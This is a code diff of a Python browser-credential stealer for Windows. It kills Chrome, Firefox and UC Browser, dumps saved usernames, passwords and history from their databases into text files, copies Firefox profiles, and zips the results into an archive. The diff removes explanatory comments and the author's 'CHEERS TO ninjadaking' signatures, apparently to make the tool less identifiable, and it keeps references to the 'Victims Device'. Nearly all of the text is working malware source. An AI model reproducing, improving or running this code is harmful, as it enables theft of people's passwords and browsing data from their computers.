@@ -17,21 +17,17 @@ def killprocess():
     os.system("Taskkill /F /IM UCBrowser.exe")
     os.system("Taskkill /F /IM firefox.exe")
 
-is_windows = sys.platform.startswith('win')
-if (is_windows == True ):
+if (sys.platform.startswith('win') == True ):
     print('Windows ' + platform.version() + ' Detected!')
 
-   #Killing all Browsers
     process = os.popen('tasklist ').read()
     if 'UCBrowser.exe' or 'chrome.exe' or 'firefox.exe' in process:
         killprocess()
     else:
         pass
 
-    #Main Function Starts From Here :-
 
-    #For CHROME 
-    def chromelogindata():  #This Functions logs all saved passwords in chrome_credentials.txt
+    def chromelogindata():  
         data_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
         login_db = os.path.join(data_path, 'Login Data')
         c = sqlite3.connect(login_db)
@@ -49,7 +45,7 @@ if (is_windows == True ):
                     f.write("\n"+url+"\n"+credentials[0].encode('utf-8')+ " >> "+credentials[1]+"\n")
                 else:
                     print("Username Password Not Found!!! \n Seems Like Chrome Browser is not installed on Victims Device")
-            f.write("\n\n" + "[+]CHEERS TO #ninjadaking!!!")
+            f.write("\n\n" + "[+]Done")
         
     def chromehistory(): #This Functions logs all chrome history in chrome_history.txt
         history_path = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
@@ -62,7 +58,7 @@ if (is_windows == True ):
         with open ('chrome_history.txt','w') as f:
             for title, url in history:
                 f.write("\n"+  title.encode('utf-8').strip() + " >> " + url.encode('utf-8').strip() + "\n")
-            f.write("\n\n" + "#CHEERS TO ninjadak1ng!!!")
+            f.write("\n\n" + "[+]Done")
 
     #Checking if chrome is installed :
     chromepath = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
@@ -101,7 +97,7 @@ if (is_windows == True ):
                     f.write("\n"+url+"\n"+credentials[0].encode('utf-8')+ " >> "+credentials[1]+"\n")
                 else:
                     print("Username Password Not Found!!! \n Seems Like UC Browser PC is not installed on Victims Device")
-            f.write("\n\n" + "[+]CHEERS TO #ninjadaking!!!")
+            f.write("\n\n" + "[+]Done")
 
     def UChistory():
         UC_path = os.path.expanduser('~')+"\AppData\Local\UCBrowser"
@@ -118,7 +114,6 @@ if (is_windows == True ):
                 f.write("\n" +  title.encode('utf-8').strip() + " >> " + url.encode('utf-8').strip() + "\n")
             f.write("\n\n" + "#CHEERS TO ninjadak1ng!!!")
 
-    #Checking if UC Browser PC is Installed or not on Victims machine :
     ucpath32 = "C:\Program Files (x86)\UCBrowser"
     ucpath64 = "C:\Program Files\UCBrowser"
     if os.path.isdir(ucpath32) or os.path.isdir(ucpath64)  == True:
@@ -138,7 +133,6 @@ if (is_windows == True ):
             uccd.write("Unable to Locate UC Browser Installation!!!")
         pass
 
-    #For MOZILLA FIREFOX
     def mozilla_steal():
         moz_path = os.path.expanduser('~')+"\AppData\Roaming\Mozilla\Firefox\Profiles"
         source = os.listdir(moz_path)
@@ -156,7 +150,6 @@ if (is_windows == True ):
             moz.write('Unable to loacte Mozilla Firefox Installation !!!')
         pass
 
-    #COMPRESSING ALL DATA into zip file and Hiding :
     path = os.getcwd() +'\\'+'archive.zip'
     azip = zipfile.ZipFile(path, 'w')
     txtpath = os.getcwd()
